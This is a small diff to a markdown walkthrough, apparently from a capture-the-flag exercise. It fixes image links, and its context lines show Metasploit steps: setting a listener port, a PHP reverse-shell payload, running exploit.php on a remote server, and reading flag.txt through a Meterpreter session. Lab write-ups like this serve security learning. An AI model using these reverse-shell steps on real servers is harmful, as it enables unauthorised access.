@@ -85,10 +85,10 @@ Steps to set up:
     - ``` set LPORT 4445```
     - ```set exploit php/reverse_php```
     - ```exploit```
-    - ![](Img/msfvenom2.png)
+     ![](Img/msfvenom2.png)
 - Open exploit.php in web to run on remote server
 - Meterpreter session
   - ```cd /```
   - ```ls```
   - ```cat flag.txt```
-  - ![](Img/flag.txt)
+   ![](Img/flag.png)
